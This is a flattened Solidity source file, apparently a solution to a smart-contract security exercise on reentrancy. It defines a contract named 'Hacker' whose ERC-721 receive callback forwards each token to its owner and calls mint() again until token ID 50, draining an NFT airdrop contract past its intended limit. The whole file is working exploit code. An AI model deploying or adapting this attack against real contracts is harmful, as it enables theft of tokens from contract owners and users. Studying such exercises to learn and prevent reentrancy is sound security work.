// Sources flattened with hardhat v2.13.0 https://hardhat.org

// File contracts/reentrancy-2/Attacker.sol
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "hardhat/console.sol";

interface IApesAirdrop {
  function mint() external returns (uint16);

  function transferFrom(address, address, uint256) external;

  function grantMyWhitelist(address to) external;
}

contract Hacker is IERC721Receiver {
  IApesAirdrop apesAirdrop;
  address payable owner;
  uint8 increment;

  constructor(address _apesAirdrop) {
    apesAirdrop = IApesAirdrop(_apesAirdrop);
    owner = payable(msg.sender);
  }

  function onERC721Received(
    address operator,
    address from,
    uint256 tokenId,
    bytes memory data
  ) public returns (bytes4) {
    // Your logic here
    apesAirdrop.transferFrom(address(this), owner, tokenId);
    if (tokenId < 50) {
      apesAirdrop.mint();
    }
    return this.onERC721Received.selector;
  }

  function attack() external {
    apesAirdrop.mint();
  }

  fallback() external payable {}

  receive() external payable {}
}
